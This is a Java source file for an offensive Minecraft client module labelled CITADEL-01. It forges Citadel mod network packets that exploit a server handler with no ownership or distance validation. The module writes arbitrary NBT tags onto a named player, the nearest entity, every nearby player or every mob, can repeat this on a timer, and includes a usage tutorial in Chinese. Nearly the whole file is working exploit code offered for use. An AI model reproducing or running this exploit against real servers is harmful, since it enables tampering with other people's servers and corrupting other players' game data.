package com.redblue.red.modules.citadel;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.network.FriendlyByteBuf;
import net.minecraft.resources.ResourceLocation;
import net.minecraft.world.entity.Entity;
import net.minecraft.world.entity.LivingEntity;
import net.minecraft.world.entity.player.Player;
import net.minecraftforge.fml.ModList;

import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;

/**
 * CITADEL-01: Arbitrary entity CitadelTag override via PropertiesMessage.
 *
 * The server handler accepts client-provided entityID + CompoundTag and writes
 * it to any LivingEntity's CitadelData without ownership or distance validation.
 *
 * Wire format (after discriminator byte 0):
 *   PacketBufferUtils.writeUTF8String(propertyID)  -- VarInt(2-byte) length + UTF8
 *   PacketBufferUtils.writeTag(compound)            -- FriendlyByteBuf.writeNbt()
 *   writeInt(entityID)                              -- 4 bytes big-endian
 */
public class CTD01_EntityTagOverride implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("citadel", "main_channel");
    private static final int IDX_PROPERTIES_MESSAGE = 0;

    private long lastTick = 0;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofEnum("property_id", "属性ID",
                "CitadelTagUpdate", "CitadelTagUpdate", "CitadelPatreonConfig"),
        ConfigParam.ofEnum("target_mode", "目标模式",
                "BY_NAME", "BY_NAME", "NEAREST", "ALL_PLAYERS", "ALL_MOBS"),
        ConfigParam.ofPlayer("target_player", "目标玩家名")
                .visibleWhen("target_mode", "BY_NAME"),
        ConfigParam.ofFloat("range", "最大范围", 64f, 1f, 256f)
                .visibleWhen("target_mode", "NEAREST", "ALL_PLAYERS", "ALL_MOBS"),
        ConfigParam.ofString("tag_key", "NBT键名", "CitadelFollowerType"),
        ConfigParam.ofString("tag_value", "NBT字符串值", "corrupted"),
        ConfigParam.ofInt("interval", "自动间隔(tick)", 20, 1, 200)
    );

    @Override public String id() { return "ctd01_entity_tag_override"; }
    @Override public String name() { return "实体标签覆写"; }
    @Override public String description() {
        return "向任意生物写入自定义CitadelData";
    }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 选择「目标模式」：按玩家名(BY_NAME)、最近实体(NEAREST)、全部玩家(ALL_PLAYERS)或全部怪物(ALL_MOBS)\n"
            + "2. 若选择BY_NAME模式，在「目标玩家名」中填写目标玩家的名字\n"
            + "3. 填写要写入的「NBT键名」和「NBT字符串值」\n"
            + "4. 点击「执行」进行单次写入，或启用自动循环按间隔持续写入\n\n"
            + "[参数说明]\n"
            + "- property_id: 属性ID，可选CitadelTagUpdate或CitadelPatreonConfig\n"
            + "- target_mode: 目标选择模式，BY_NAME/NEAREST/ALL_PLAYERS/ALL_MOBS\n"
            + "- target_player: 目标玩家名，仅BY_NAME模式下生效\n"
            + "- range: 最大搜索范围，范围1~256，默认64\n"
            + "- tag_key: 要写入的NBT键名，默认CitadelFollowerType\n"
            + "- tag_value: 要写入的NBT字符串值，默认corrupted\n"
            + "- interval: 自动循环的Tick间隔，范围1~200，默认20\n\n"
            + "[注意事项]\n"
            + "- 需要服务器安装了Citadel模组才可使用\n"
            + "- BY_NAME模式下目标玩家名不能为空，否则不会执行\n"
            + "- ALL_PLAYERS和ALL_MOBS模式会影响范围内所有符合条件的实体";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("citadel");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        doAttack(mc);
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        int interval = getParam("interval").map(ConfigParam::getInt).orElse(20);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;
        doAttack(mc);
    }

    private void doAttack(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;

        String propertyId = getParam("property_id").map(ConfigParam::getString)
                .orElse("CitadelTagUpdate");
        String mode = getParam("target_mode").map(ConfigParam::getString).orElse("BY_NAME");
        float range = getParam("range").map(ConfigParam::getFloat).orElse(64f);
        String tagKey = getParam("tag_key").map(ConfigParam::getString).orElse("CitadelFollowerType");
        String tagValue = getParam("tag_value").map(ConfigParam::getString).orElse("corrupted");

        CompoundTag payload = new CompoundTag();
        payload.putString(tagKey, tagValue);

        List<Integer> targetIds = collectTargets(mc, mode, range);
        for (int entityId : targetIds) {
            sendPropertiesMessage(propertyId, payload, entityId);
        }
    }

    private List<Integer> collectTargets(Minecraft mc, String mode, float range) {
        List<Integer> ids = new ArrayList<>();

        switch (mode) {
            case "BY_NAME" -> {
                String targetName = getParam("target_player").map(ConfigParam::getString).orElse("");
                if (targetName.isEmpty()) return ids;
                for (Player p : mc.level.players()) {
                    if (p == mc.player) continue;
                    if (p.getGameProfile().getName().equalsIgnoreCase(targetName)) {
                        ids.add(p.getId());
                        break;
                    }
                }
            }
            case "NEAREST" -> {
                Entity nearest = null;
                double nearestDist = Double.MAX_VALUE;
                for (Entity e : mc.level.entitiesForRendering()) {
                    if (e == mc.player) continue;
                    if (!(e instanceof LivingEntity)) continue;
                    double d = mc.player.distanceTo(e);
                    if (d <= range && d < nearestDist) {
                        nearest = e;
                        nearestDist = d;
                    }
                }
                if (nearest != null) ids.add(nearest.getId());
            }
            case "ALL_PLAYERS" -> {
                for (Player p : mc.level.players()) {
                    if (p == mc.player) continue;
                    if (mc.player.distanceTo(p) <= range) {
                        ids.add(p.getId());
                    }
                }
            }
            case "ALL_MOBS" -> {
                for (Entity e : mc.level.entitiesForRendering()) {
                    if (e == mc.player) continue;
                    if (!(e instanceof LivingEntity)) continue;
                    if (e instanceof Player) continue;
                    if (mc.player.distanceTo(e) <= range) {
                        ids.add(e.getId());
                    }
                }
            }
        }
        return ids;
    }

    private void sendPropertiesMessage(String propertyId, CompoundTag compound, int entityId) {
        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(IDX_PROPERTIES_MESSAGE);
            // writeUTF8String: VarInt(2-byte max) length prefix + UTF8 bytes
            writeUTF8String(buf, propertyId);
            // writeTag: wraps FriendlyByteBuf.writeNbt
            buf.writeNbt(compound);
            // writeInt: 4 bytes big-endian
            buf.writeInt(entityId);
        });
    }

    /**
     * Matches PacketBufferUtils.writeUTF8String exactly:
     * writeVarInt(bytes.length, 2) + writeBytes(bytes)
     */
    private static void writeUTF8String(FriendlyByteBuf buf, String s) {
        byte[] bytes = s.getBytes(java.nio.charset.StandardCharsets.UTF_8);
        writeVarInt(buf, bytes.length, 2);
        buf.writeBytes(bytes);
    }

    /** Matches PacketBufferUtils.writeVarInt(buf, value, maxBytes) */
    private static void writeVarInt(FriendlyByteBuf buf, int value, int maxBytes) {
        while ((value & -128) != 0) {
            buf.writeByte(value & 127 | 128);
            value >>>= 7;
        }
        buf.writeByte(value);
    }
}
